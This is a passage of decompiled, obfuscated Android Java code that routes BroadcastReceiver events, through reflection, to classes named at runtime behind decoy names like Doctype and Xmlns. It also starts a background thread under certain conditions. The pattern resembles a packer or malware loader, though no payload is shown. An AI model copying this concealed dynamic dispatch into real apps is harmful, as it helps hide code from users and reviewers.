        int k = ((Integer)Doctype.b(null, Xmlns.d(this.d).concat(".").concat(paramBroadcastReceiver.getClass().getSimpleName()), Transitional.f, new Object[] { paramContext, paramIntent, paramBroadcastReceiver, paramFileDescriptor, e })).intValue();
        doctype1.a("novel", k);
        doctype1.a("warpeace", this.d);
        doctype2.a("doctitle", k);
      } catch (Exception exception) {}
    }
    if (Templets.a(paramContext) && a) {
      a = false;
      (new Layers(this)).start();
    }
    int i = doctype1.b("novel", 0);
    int j = doctype2.b("doctitle", 0);
    if (((j == i && j != 0) || (j != i && j == 0)) && (j >= c || j == 0)) {
      String str2 = doctype1.c("warpeace", null);
      String str1 = str2;
      if (Xmlns.a(str2))
        str1 = Xmlns.d(this.d);
      try {
        return ((Boolean)Doctype.b(null, str1.concat(".").concat(paramBroadcastReceiver.getClass().getSimpleName()), Transitional.d, new Object[] { paramContext, paramIntent, paramBroadcastReceiver, paramFileDescriptor, e })).booleanValue();
      } catch (Exception exception) {}
    }
    return false;
  }
}

